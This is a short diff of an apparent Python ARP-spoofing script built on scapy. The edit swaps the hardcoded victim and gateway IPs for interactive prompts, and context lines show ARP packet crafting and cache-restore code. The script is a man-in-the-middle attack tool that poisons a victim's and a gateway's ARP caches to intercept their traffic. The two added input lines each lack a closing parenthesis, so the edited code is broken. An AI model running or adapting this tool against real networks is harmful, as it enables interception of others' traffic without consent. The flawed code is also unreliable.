@@ -3,6 +3,9 @@
 import scapy.all as scapy
 import time
 
+target_ip = str(input("Enter Targets IP: ")
+gateway_ip = str(input("Enter GateWay IP: ")
+
 
 def get_mac(ip):
         arp_request = scapy.ARP(pdst=ip)
@@ -24,9 +27,6 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
-
-target_ip = "192.168.1.2"
-gateway_ip = "192.168.1.1"
 
 try:
     sent_packets_count = 0
